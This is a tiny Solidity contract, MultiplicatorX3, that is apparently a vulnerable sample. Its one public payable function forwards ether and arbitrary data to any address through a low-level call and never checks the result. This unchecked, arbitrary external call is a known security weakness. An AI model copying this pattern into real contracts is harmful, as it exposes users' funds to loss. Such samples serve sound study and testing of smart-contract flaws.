// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract MultiplicatorX3 {

    function Command(address adr, bytes data) payable public {
        adr.call.value(msg.value)(data);
    }
}
